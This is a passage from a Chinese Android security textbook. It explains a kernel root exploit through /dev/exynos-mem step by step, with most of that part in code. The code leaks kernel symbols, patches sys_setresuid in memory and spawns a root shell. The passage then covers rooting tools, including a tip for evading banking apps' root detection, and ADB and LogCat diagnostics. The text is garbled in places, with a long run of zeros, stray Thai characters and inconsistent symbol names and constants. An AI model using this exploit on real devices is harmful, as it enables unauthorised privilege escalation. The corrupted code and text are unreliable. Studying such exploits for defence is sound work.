第41行~第43行的攻击代码会通过部分过程提升自己的权限，最后会运行execve API，此时使用第41行、第42行、第43行声明的变量。

如前所述，所有用户均可访问/dev/exynos-mem文件，而/dev是保存可访问系统硬件的设备文件的文件夹。

攻击者如果想访问内核内存区域，先要打开/dev/exynos-mem文件，使用mmap设置和内存区域大小相同的位移（offset）。

第54行~第58行以读写权限打开/dev/exynos-mem文件以使用mmapAPI。

通过man命令查看mmap函数原型，定义如下。

名称

mmap, munmap - 将文件或设备映射到内存或断开映射。

使用方法

#include <unistd.h>
#include <sys/mman.h>
#ifdef _POSIX_MAPPED_FILES

void * mmap (void*start, size_tlength, intprot, intflags, intfd,
    off_offset);
int munmap (void *start, size_t length);
#endif

说明

mmap()函数在fd指定的文件（或其他对象）中与start地址映射，从offset起始，长度为length字节。

该地址最好仅为其本身，通常指定为0。mmap返回指定区域映射的实际起始位置。

prot参数设置需要的内存保护模式。相应位如下：

* PROT_EXE 该页可执行。

* PROT_READ 该页可读。

* PROT_WRITE 该页可写。

* PROT_NONE 该页无法访问。

flags参数负责设置映射的对象类型、映射选项、对映射页副本的修正等仅显示于该进程，或可与其他引用的进程共享。相应位如下：

MAP_FIXED 不选择指定地址外的其他地址。如果指定地址不可用，则mmap失败。

指定MAP_FIXED后，start应为页面大小的整数倍。最好不要使用该选项。

MAP_SHARED 共享该对象映射的其余所有进程及映射区域。

MAP_PRIVATE 创建单独的copy-on-write映射。(不共享其他进程和映射区域)

必须声明MAP_SHARED和MAP_PRIVATE之一。

上述3个标记由POSIX.1b（官方是POSIX.4）定义。Linux系统中还有MAP_DENYWRITE、MAP_EXECUTABLE和MAP_ANON（YMOUS）。

munmap系统调用会断开对指定地址空间的映射。范围内地址的引用计数增加后，创建为无效的内存引用。

 </div>

具体操作过程可整理为：①使用fd(/dev/exynos-mem)打开指定文件②从PHYS_OFFSET(0x40000000)起始③使用length(4096*4096)大小的区域把文件或设备映射到内存，内存是页的单位，页面属性赋予④PROT_READ，PROT_WRITE读写权限⑤映射后的内存与所有进程共享映射区域。

学过C语言的人应该都用过格式控制符。请看以下代码。

样本源代码

#include <stdio.h>

int main(int argc, char* argv[]) {
    int a = 10;
    printf("a值：%d a的地址：%p\n", a, &a);
    return 0;
}

编写代码后使用格式控制符%d显示整数变量a的值，使用%p显示保存a变量的内存地址。也有%pk格式控制符，此格式控制符只能在内核层显示。

在x86版本的Ubuntu Linux环境下使用Root权限运行cat /proc/kallsyms就能显示映射到内核的符号（symbol）地址。

##### guest权限

namdaehyeon@ubuntu:~$ cat /proc/kallsyms | grep sys_setresuid
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

fffffffff810a3d10 T sys_setresid16
root@samsung:/home/namdaehyeon#

Android环境下的默认权限是shell。使用shell权限打开/proc/kallอน่าแรก地址无法显示映射到内核的符号地址，甚至拥有root权限也无法显示。

无法显示地址是因为安全问题，只能在内核层查看。

shell权限

shell@flo:/ $ cat /proc/kallsyms
00000000 T stext
00000000 T _text
00000000 t _create_page_tables
00000000 t _turn_mmu_on_loc
root权限
root@flo:/ # id
uid=0(root) gid=0(root) context=u:r:init_shell:s0
root@flo:/ # cat /proc/kallsyms
00000000 T stext
00000000 T _text
00000000 t _create_page_tables
00000000 t _turn_mmu_on_loc

上述文本中显示各地址的格式控制符如图2-70所示。

 </div>

由图2-70可知，使用格式控制符%pK %c %s输出地址选项API。为了在用户层也能显示第73行~第83行代码，把只能在内核层显示的格式控制符%pK转换为%p。

该过程是为了获取sys_setresult地址, 这个地址可以把运行中的攻击代码进程权限提升到Root权限。

将%PK修改为%p后，使用81080ac0 T sys_setresid在00000000 T sys_setresid显示内核区域的地址。

如图2-71所示修改如下格式控制符，运行cat /proc/kallsyms显示各符号地址。

##### 图2-71 符号地址

/* kallsyms now display symbols address */
kallsyms = fopen("/proc/kallsyms", "r");
    if (kallsyms == NULL) {
        printf("[!] kallsyms error: %s\n", strerror(errno));
        exit(1);
    }

以上是第92行~第97行代码。在格式控制符由%pK替换为%p的环境下，使用读取模式打开/proc/kallsyms，以获取sys_setresult地址。

修改格式控制符后读取/proc/kallsyms显示如下符号地址。

81322c00 T gen_pool_destroy
81322cb0 T inflate_fast
813232e0 t zlib_updatewindow
813233d0 T zlib_inflate_workspacesize
813233e0 T zlib_inflateReset

下列代码会以之前输出的信息为基础，查找并解析sys_setresid符号地址。例如，如果有813233e0 T sys_setresid字符串值，那么运行下一命令后会将813233e0值保存到addr_sym变量。

/* parse /proc/kallsyms to find sys_setresid address */
while((ptr = fgets(line, 512, kallsyms)) {
    str = strtok(ptr, " ");
    addr_sym = strtoul(str, NULL, 16);
    index = 1;
    while(str) {
        str = strtok(NULL, " ");
        index++;
        if (index == 3) {
            if (strncmp("sys_setresid\n", str, 14) == 0) {
                printf("[*] sys_setresid found at 0x%08X\n", addr_sym);
                found = true;
            }
        }
    }
}

}
break;
}
}

下列代码找到sys_setresid符号地址并升级正在运行的攻击代码权限后, 才能运行最终目标——/system/bin/sh。

[References: http://wiki.bit-hive.com/north/pg/ruid%2Fsuid%2Feuid%2Ffsuid]为了使用setresuid提升权限，需要调用下列3个API。

SYSCALL_DEFINE1 (setuid, uid_t, uid)

SYSCALL_DEFINE2 (setreuid, uid_t, ruid, uid_t, euid)

SYSCALL_DEFINE3 (setresuid, uid_t, ruid, uid_t, euid, uid_t, suid)

上述3种Syscall过程中，如果普通用户的uid不是suid，则无法提升权限。

通过shell权限运行的攻击代码程序使用setresult(0, 0, 0)提升到Root权限时，也会调用上面提到的3个Syscall以搜索提升权限所需条件。当然，因为以shell权限运行的攻击代码uid不是suid，所以无法提升。

攻击代码会在为了提升权限而映射的内存中查找验证之前提到的API是否为正确uid的部分代码，给内存“打补丁”是为了在不符合条件的情况下也能提升权限。如下第119行~第121行所示。

//起始内存映射地址
tmp = paddr;

//从搜索到的符号地址中删除Kernel内存领域的起始点0xc0000000
//并将（2 ^（addr_sym - 0xC0000000））的结果
//与tmp中保存的paddr相加。
//因为大小为page_size * page_size，所以可以推断为（2 ^（addr_sym - 0xC0000000）
tmp +=（addr_sym - PAGE_OFFSET）>> 2;

for (m=0;m<128;m+=4) {
    //如果tmp地址的值是0xe3500000，就按4字节搜索映射内存，
    //找到0x000050e3值时修改指针值。
    if (*(unsigned long *)tmp == 0xe3500000) {
        printf("[*] patching sys_setresuid at 0x808X\n", addr_sym + m);

        //临时保存提升权限后需恢复的地址。
        restore_ptr_setresuid = tmp;

        //为了绕过if(条件)语句，将保存0xe3500000值的指针值改为0x0100050e3。
        *(unsigned long *)tmp = 0xe3500001;
        break;
    }
    tmp++;
}

break;
}
}

补丁代码已将原来的sys_setresid代码值0x000050e3改为0x0100050e3，所以以shell权限运行的攻击代码在运行可以把自己提升到Root权限的setresid(0, 0, 0)时，必须符合条件才能运行的那部分已经失灵，故能获取Root权限。

既然已获取Root权限，那么只要运行execve("/system/bin/sh",0,0)就能获得"#提示符"(Root权限)。

下列代码把为了获取Root权限而修改的所有数据恢复到初始状态，并关闭了打开的文件。

//关闭为了读取kernel符号地址sys_setresid而打开的/proc/kallisms。
fclose(kallisms);

//sleep 0.1秒
usleep(100000);

//将正在运行的Exploit进程权限提升为root。
result = setresid(0, 0, 0);

//恢复为了显示kernel符号地址而修改的%PK -> %p值。
*(unsigned long *)restore_ptr_fmt = 0x204b7025;

//恢复为了提升权限而修改的0xe3500001值。
*(unsigned long *)restore_ptr_setresid = 0xe3500000;

//删除包含进程地址空间页的所有内存映射。
munmap(paddr, length);

//关闭可以访问kernel区域内存的驱动/dev/exynos-mem。
close(fd);

//获取Root权限失败时的错误处理。
if (result) {
    printf("[!] set user root failed: %s\n", strerror(errno));
    exit(1);
}

//正在运行的exploit已获取Root权限，所以使用execve API
//执行cmd[0]变量=/system/bin/sh，这样即可获取Root权限。
execve(cmd[0], cmd, env);

//程序正常终止
return 0;
}

本节讲解了攻击代码使用示例, 接下来介绍普通用户通过轻松操作即可获取Root权限的两种方法。

#### 2.3.2 使用Tegrak内核

Tegrak内核是获取三星Galaxy系列手机Root权限或支持某些实用工具运行的定制版内核，它没有使用三星的开源程序，而是在三星正式发布的固件里添加了可执行文件和实用工具包。为了让新手也能轻松获取Root权限或使用各种实用工具，Tegrak提供了简洁的UI（用户界面）。此次平台切换操作将使用Galaxy S3 LTE。

在已安装USB驱动程序的前提下，需要进行如下准备。

##### 准备工作

Tegrak内核（http://pspmaster.tistory.com/96）

☐ 支持的设备 Galaxy S3 3G/LTE、Galaxy Note 1/2 等

(下载匹配自己Android设备或固件的版本。Tegrak内核使用7zip进行压缩，下载后请解压。)

☐ Odin 上传Tegrak内核到Android设备。

关闭Android设备（以Galaxy S3为例）的电源后进入下载模式。同时按下“音量减键+Home键+电源键”2~3秒后进入如图2-72所示画面。

 </div>

进入下载模式后，使用USB连接PC和Android设备，并运行Odin。然后点击PDA按钮，在弹

出窗口中选择Tegrak内核。

 </div>

完成上述操作后单击Start按钮，把Tegrak内核上传至Galaxy S3。之后会出现PASS提示，Android设备将自动重启。

 </div>

取消Option中的Auto Reboot选项就不会自动重启。重启后从Google Play Store下载并安装Tegrak内核。

 </div>

运行Tegrak内核后可以查看其中可用的菜单，如图2-75所示。选择菜单的Enable Rooting就能自动获取Root权限。

 </div>

需要注意的是，获取Root权限后将很难使用银行等金融类这种拦截Rooting App的应用程序。此时单击Disable Rooting 将暂时关闭Root权限，因此，使用此方法可以绕过只检查Root权限的环境。

对安全措施做得比较强的应用程序进行漏洞检测时，应用程序会检测Rooting权限及Rooting相关进程，所以需要进一步绕过验证。这种方法被恶意使用的概率极大，本书不会介绍相关内容。

 </div>

   </div>

#### 2.3.3 使用CF-Auto-Root

第二种方法是使用CF-Auto-Root。CF-Auto-Root主要在三星固件上运行，初级用户也可以轻松安装SuperSu二进制文件、SuperSU.APK、Stock recovery。需要进行如下准备。

##### 准备工作

□ CF-Auto-Root (http://autoroot.chainfire.eu/)

下面是CF-Auto-Root支持的设备信息，从这里下载符合自己情况的文件。

 </div>

##### ☐ 下载CF-Auto-Root

 </div>

将下载的CF-Auto-Root文件解压，可以看到CF-Auto-Root软件包和Odin（图2-80）。

 </div>

关闭Android设备电源后进入下载模式（Galaxy S3：音量减键+Home键+电源键）。

进入下载模式后，使用USB连接PC和Android设备，并运行Odin。如图2-82所示单击PDA按钮后，选择之前下载的CF-Auto-Root文件。

 </div>

 </div>

选择文件后单击Start按钮，开始上传CF-Auto-Root文件。之后会显示PASS字符，Android设备将自动重启。

 </div>

如图2-84所示，如果重启过程中看到红色Android标志，就说明机器正在安装SuperSU二进制文件和SuperSU.APK、Stock recovery。用户在此过程中不需要进行任何操作。

 </div>

红色Android标志消失则表示完成启动。如果能在程序列表中看到SuperSU，则说明已成功获取 Root权限。

 </div>

#### oo UnRooting方法

永久UnRooting的方法是，在SuperSU设置中点击“完全取消Root权限”，接着弹出警告窗口（图2-86）。查看警告信息后继续点击，即可删除SuperSU及Rooting相关文件。

 </div>

虽然可以在此状态下继续使用，但为了保证效果，建议进行一次“恢复出厂设置”。

可参考下列URL。

http://forum.xda-developers.com/showthread.php?t=1980683

□ http://autoroot.chainfire.eu/

### 2.4 Android 诊断工具介绍

本节将讲解如何使用Android SDK平台默认安装工具进行分析。此处提及的工具是诊断恶意代码及服务时必备的工具或命令，希望各位熟悉其使用方法。

### 2.4.1 ADB基本命令

ADB（Android Debug Bridge）可以针对模拟器环境下的Android设备或连接PC的真实设备进行安装软件包、执行服务命令和shell命令等操作。本节只介绍诊断时需要的命令，详细内容请参考开发人员文档。

http://developer.android.com/tools/help/adb.html

http://code.google.com/android/reference/adb.html

表2-6整理了adb中的常用选项，分析和诊断移动应用程序时，了解这些选项就足够了。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>devices [-I]</td><td style='text-align: center; word-wrap: break-word;'>已连接的所有设备及AVD目录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>connect &lt;host&gt;[:&lt;port&gt;]</td><td style='text-align: center; word-wrap: break-word;'>使用TCP/IP连接设备</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>默认设置：连接5555/TCP端口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb push &lt;local&gt;&lt;remote&gt;</td><td style='text-align: center; word-wrap: break-word;'>从PC复制文件及目录至设备</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb pull &lt;remote&gt; [&lt;local&gt;]</td><td style='text-align: center; word-wrap: break-word;'>从设备复制文件及目录至PC</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb sync [&lt;directory&gt;]</td><td style='text-align: center; word-wrap: break-word;'>从PC复制已修改的文件至设备</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb shell</td><td style='text-align: center; word-wrap: break-word;'>运行并连接设备的shell</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb shell &lt;command&gt;</td><td style='text-align: center; word-wrap: break-word;'>在shell上运行命令</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb emu &lt;command&gt;</td><td style='text-align: center; word-wrap: break-word;'>运行模拟器控制台命令</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb logcat [&lt;filter-spec&gt;]</td><td style='text-align: center; word-wrap: break-word;'>监控设备日志</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb forward &lt;local&gt;&lt;remote&gt;</td><td style='text-align: center; word-wrap: break-word;'>连接到网络</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>tcp:&lt;port&gt;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>localabstract:&lt;unix domain socket name&gt;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>localreserved:&lt;unix domain socket name&gt;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>localfilesystem:&lt;unix domain socket name&gt;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>dev:&lt;character device name&gt;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>jdwp:&lt;process pid&gt;(remote only)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb install [-I] [-r] [-s]</td><td style='text-align: center; word-wrap: break-word;'>保存apk文件到设备并开始安装（默认使用adb install apk [文件]命令）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[--algo &lt;algorithm name&gt;</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>--key &lt;hex-encoded key&gt;</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>--iv &lt;hex-encoded iv&gt; &lt;file&gt;</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>adb uninstall [-k] &lt;package&gt;</td><td style='text-align: center; word-wrap: break-word;'>删除设备中的软件包</td></tr></table>

正常构建环境后，可以在运行AVD时添加/删除模拟器中的设备，如图2-87所示。请运行其中一个测试环境。

 </div>

模拟器正常工作则输入adb devices命令查看当前连接信息。图2-88显示emulator-0000设备列表，这表示没有连接真实设备，而是运行AVD后只有模拟器运作的情况。在Eclipse环境下查看设备信息时，也可以看到模拟器。

 </div>

如图2-89所示，使用traceview查看模拟器上运行的进程，可以实时确认运行中的进程。分析恶意代码时，有时会在运行后立刻自行删除，此时也可以使用此工具监控。之后使用开发工具进行动态调试时，也会用到端口。

 </div>

添加一个真实移动设备后，可以在adb命令行窗口和Eclipse环境下看到2个设备。

 </div>

连接2个以上设备后，输入adb devices命令显示所有设备的信息。如果连接了实际的移动设备，就必须开启“开发人员调试模式”并解锁桌面（请参考2.1.3节补充说明部分：“设置调试模式以在实际设备中进行测试”）。

 </div>

频繁连接/解除多个设备时，使用adb devices命令有时会不显示设备信息。此时可以使用adb kill-server命令，然后运行adb devices命令即可正常显示。

只连接1个设备时，输入adb shell命令就能进入shell命令模式。因为是基于Linux开发的系统，所以可以直接使用部分Linux命令。命令文件保存在/system/bin目录下，如图2-93所示。

 </div>

 </div>

连接2个以上设备就会如图2-94所示的错误，此时可以使用 $ -s $选项指定设备并连接。

 </div>

进入shell模式后，输入ls和ps命令可以查看设备内部结构。但是，有些命令的选项与Linux的选项并不完全相同。例如，使用ps命令查看进程时，不会运行ps -aux等显示详细信息的选项。

检测时可以安装BusyBox以弥补命令行的不足。BusyBox安装信息可以参考2.4.5节。

 </div>

按Ctrl+D键从Android设备的shell模式退出到Windows命令行窗口，一次不行可多按几次。

可以使用adb安装或删除App。adb install命令可以把apk文件安装到设备。apk文件需要正常进行签名（Sign），没有签名就不能安装。使用“环境构建”中介绍的Eclipse生成apk文件时会自动进行签名，签名相关内容将在第3章进行详细说明。下面是将Google Play相关恶意代码apk文件安装到设备的过程（也可以使用其他apk文件进行测试）。

E:\Android\Malware>adb install GooglePlayer_malware.apk
54 KB/s (99627 bytes in 1.779s)
.pkg: /data/local/tmp/GooglePlayer_malware.apk
Success

adb uninstall命令会将软件包从设备中删除。需要注意的是，并不输入文件名，而是如下输入已安装软件包的信息。可以浏览设备中的/data/data文件夹进行查找。

E:\\download\\Android\\>adb shell ls /data/data
com.android.Message
com.dseffects.MonkeyJump2
com.android.music
com.android.development
com.android.calculator2
com.android.providers.applications
com.android.defcontainer
com.android.providers.downloads.ui
com.android.term
com.android.htmlviewer
com.android.provision
com.android.systemui
com.android.certinstaller
com.android.packageinstaller
com.svox.pico
com.android.providers.subscribedfeeds
com.android.inputmethod.pinyin
com.android.soundrecorder
com.android.providers.DRM
com.android.camera
com.android.calendar
com.android.speechrecorder
com.android.contacts
com.android.server.vpn
android.tts

在已安装的多个软件包中，删除疑似恶意代码com.android.Message。看到“Success”信息就说明成功删除。

E:\download\Android\Malware>adb uninstall com.android.MessageSuccess

不能删除则进入设置>应用程序管理（Manage Applications）强制停止运行（Force Stop），然后删除（图2-96）。

 </div>

#### 2.4.2 导出/导入设备中的apk文件

有多种方法可以将设备中的apk文件导出至本地PC进行分析，此处只介绍使用adb shell命令和文件浏览器这两种导出方法。

# 1. 使用adb shell导出

可以使用之前介绍的adb shell将apk文件导出至本地PC。使用adb shell连接设备后，输入su-命令转到管理员（root）权限，否则不能浏览data文件夹。

 </div>

如图2-97所示，转到/data/app目录查看apk文件的保存位置和名称。使用adb pull命令把相关apk文件保存到本地PC，如图2-98所示。

 </div>

# 2. 使用文件浏览器导出

在Android环境下安装程序后，apk文件会保存到设备。虽然可以使用adb命令导出apk文件，但还有更简单的方法。我使用的手机会保存到/data/app目录，所以在已获取Root权限的情况下，可以使用文件浏览器（File Explorer）App（Root Explorer、ASTRO等）获取apk文件。

每个程序的顺序可能有所不同。首先使用Root Explorer把apk文件保存到sdcard目录，然后使用USB连接到本地PC并提取。

 </div>

图2-100表示将apk文件复制到sdcard后，使用USB连接复制文件的过程。

 </div>

还可以使用Eclipse的DDMS中的文件浏览器复制文件。必须有Root权限才能浏览上级目录的所有信息。

 </div>

#### 2.4.3 使用LogCat进行分析

LogCat可以实时查看已连接设备上运行的函数、方法、错误信息。如果开发过程中出现错误，可以实时查看是在哪个阶段产生的。动态分析时也可以使用grep命令查看特定模式，也可以用于获取恶意服务器和被恶意使用的API信息。

诊断App服务时，可以用于检查Activity相关信息、已激活方法的相关信息、App运行时是否会泄露敏感信息、是否因开发人员的疏忽而泄露不必要的日志信息等。

options include:
-s Set default filter to silent.
Like specifying filterspec '*:s'
-f <filename> Log to file. Default to stdout

-r [<kbytes>] Rotate log every kbytes. (16 if unspecified). Requires -f
-n <count> Sets max number of rotated logs to <count>, default 4
-v <format> Sets the log print format, where <format> is one of:

brief process tag thread raw time threadtime long

-c clear (flush) the entire log and exit
-d dump the log and then exit (don't block)
-t <count> print only the most recent <count> lines (implies -d)
-g get the size of the log's ring buffer and exit
-b <buffer> request alternate ring buffer
    ('main' (default), 'radio', 'events', 'audio', 'pv')
-B output the log in binary

filterspecs are a series of
<tag>[:priority]

where <tag> is a log component tag (or * for all) and priority is:
V Verbose
D Debug
I Info
W Warn
E Error
F Fatal
S Silent (supress all output)

**'means'?d' and <tag> by itself means <tag>:v

If not specified on the commandline, filterspec is set from ANDROID_LOG_TAGS.
If no filterspec is found, filter defaults to '*:I'

If not specified with -v, format is set from ANDROID_PRINTF_LOG
or defaults to "brief"

表2-7整理了常用的LogCat选项。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-5</td><td style='text-align: center; word-wrap: break-word;'>在silent中设置默认过滤器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-c</td><td style='text-align: center; word-wrap: break-word;'>删除所有日志</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-d</td><td style='text-align: center; word-wrap: break-word;'>在屏幕上显示日志</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-f 文件名</td><td style='text-align: center; word-wrap: break-word;'>以指定文件名保存日志</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-g</td><td style='text-align: center; word-wrap: break-word;'>获取日志缓存大小后停止</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-v 格式</td><td style='text-align: center; word-wrap: break-word;'>设置日志信息格式。默认为brief格式</td></tr></table>

输入如下命令可以浏览连接设备的所有日志。

C:\ >adb logcat
----- beginning of /dev/log/system
D/BatteryService( 271): update start
D/BatteryService( 271): updateBattery level:12 scale:100 status:2 health:2 present:true voltage: 3796 temperature: 280 technology

: Li-ion AC powered:false USB powered:true icon:17302215
I/StatusBarPolicy( 354): BAT. S:2 H:2
D/WifiService( 271): ACTION_BATTERY_CHANGED pluggedType: 2
D/ConnectivityService( 271): reportNetworkCondition(1, 0)
D/ConnectivityService( 271): Inet connectivity change, net=1, condition=0,mActiveDefaultNetwork=1
D/ConnectivityService( 271): starting a change hold
D/BatteryService( 271): update start
D/BatteryService( 271): updateBattery level:12 scale:100 status:2 health:2
present:true voltage: 3788 temperature: 280 technology
: Li-ion AC powered:false USB powered:true icon:17302215
I/StatusBarPolicy( 354): BAT. S:2 H:2
D/WifiService( 271): ACTION_BATTERY_CHANGED pluggedType: 2
D/ConnectivityService( 271): Inet hold end, net=1, condition=0, published condition=0
D/ConnectivityService( 271): no change in condition - aborting
D/BatteryService( 271): update start
D/BatteryService( 271): updateBattery level:12 scale:100 status:2 health:2
present:true voltage: 3796 temperature: 280 technology
: Li-ion AC powered:false USB powered:true icon:17302215
D/WifiService( 271): ACTION_BATTERY_CHANGED pluggedType: 2
I/StatusBarPolicy( 354): BAT. S:2 H:2
D/BatteryService( 271): update start
D/BatteryService( 271): updateBattery level:12 scale:100 status:2 health:2
present:true voltage: 3810 temperature: 280 technology
: Li-ion AC powered:false USB powered:true icon:17302215
I/StatusBarPolicy( 354): BAT. S:2 H:2
... (省略) ...

画面最左侧显示的缩写分别表示V-verbose、D-debug、I-information、W-Warning、E-Error、F-Fatal、S-Silent。上述结果都没有使用颜色进行区分，诊断时会有些不方便。LogCat开源程序支持使用颜色区分这些信息。Windows环境下可以访问下列地址下载文件，解压后运行批处理文件即可。

□ 服务信息：http://code.google.com/p/colored-logcat/

虽然不是很完美，但这已经可以区分错误信息、调试信息和常规信息了。

 </div>

这是使用LogCat记录的App（apk）安装到虚拟设备的过程信息。可以看到，App安装在/data/app/com.dseffects.MonkeyJump2-1.apk。

D/dalvikvm(1328)：DexOpt是优化（optimize）DEX文件的类文件的过程。

/data/dalvik-cache/data@app@com.dseffects.MonkeyJump2-1.apk@classes.dex -> /data/dalvik-cache/data@app@com.dseffects.MonkeyJump2-1.apk@classes.dex

与介绍文件目录结构时相同，dex文件会安装到dalvik-cache文件夹。软件包信息是package:com.dseffects.MonkeyJump2。诊断App时，网络部分固然重要，但活用LogCat查看设备之间传输的值是否包含重要信息也很重要。

D/AndroidRuntime(1288):

D/AndroidRuntime(1288): >>>> AndroidRuntime START
com.android.internal.os.RuntimeInit <<<<<<

D/AndroidRuntime(1288): CheckJNI is ON

D/AndroidRuntime(1288): Calling main entry com.android.commands.pm.Pm

I/ActivityManager(857): Start proc com.android.defcontainer for service
com.android.defcontainer/.DefaultContainerService: pid=1309 uid=10010
gids={1015, 2001}

D/dalvikvm(797): GC_EXPLICIT freed 11K, 51% free 2655K/5379K, external
1527K/1559K, paused 126ms

D/dalvikvm(797): GC_EXPLICIT freed <1K, 51% free 2655K/5379K, external
1527K/1559K, paused 99ms

D/dalvikvm(797): GC_EXPLICIT freed <1K, 51% free 2655K/5379K, external
1527K/1559K, paused 111ms

D/dalvikvm(1309): GC_EXPLICIT freed 316K, 52% free 2661K/5511K, external
1527K/1559K, paused 75ms

W/ActivityManager(857): No content provider found for:

W/ActivityManager(857): No content provider found for:

D/PackageParser(857): Scanning package: /data/app/vmdl261097021.tmp

W/PackageParser(857): No actions in intent filter at
/data/app/vmdl261097021.tmp Binary XML file line #14

D/dalvikvm(857): GC_CONCURRENT freed 688K, 43% free 4338K/7559K, external
4264K/5464K, paused 19ms+16ms

D/PackageManager(857): Scanning package com.dseffects.MonkeyJump2

I/PackageManager(857): Unpacking native libraries for

/data/app/com.dseffects.MonkeyJump2-1.apk

D/installd( 803): DexInv: --- BEGIN
'/data/app/com.dseffects.MonkeyJump2-1.apk' ---

D/dalvikvm( 1328): DexOpt: load 63ms, verify+opt 348ms

D/installd( 803): DexInv: --- END

'/data/app/com.dseffects.MonkeyJump2-1.apk' (success) ---

I/ActivityManager( 857): Force stopping package com.dseffects.MonkeyJump2uid=10034

D/PackageManager( 857): Services:
com.dseffects.MonkeyJump2.jump2.c.AndroidIME
D/PackageManager( 857): Receivers: com.dseffects.MonkeyJump2.f

D/PackageManager( 857): Activities: com.dseffects.MonkeyJump2.MonkeyJump2.com.dseffects.MonkeyJump2.jump2.c.rufCuAtj

I/installd( 803): move
/data/dalvik-cache/data@app@com.dseffects.MonkeyJump2-1.apk@classes.dex ->
/data/dalvik-cache/data@app@com.dseffects.MonkeyJump2-1.apk@classes.dex

D/PackageManager( 857): New package installed in
/data/app/com.dseffects.MonkeyJump2-1.apk

W/PackageManager( 857): Unknown permission android.permission.ACCESS_GPS in package com.dseffects.MonkeyJump2

W/PackageManager( 857): Unknown permission android.permission.ACCESS_LOCATION in package com.dseffects.MonkeyJump2

W/ResourceType( 857): Failure getting entry for 0x7f060000 (t=5 e=0) in package 0 (error -75)

D/VoiceDialerReceiver( 1135): onReceive Intent
{ act=android.intent.action.PACKAGE_ADDED
dat=package:com.dseffects.MonkeyJump2 flg=0x10000000
cmp=com.android.voicedialer/. VoiceDialerReceiver (has extras) }

V/RecognizerEngine( 1135): deleteCachedGrammarFiles
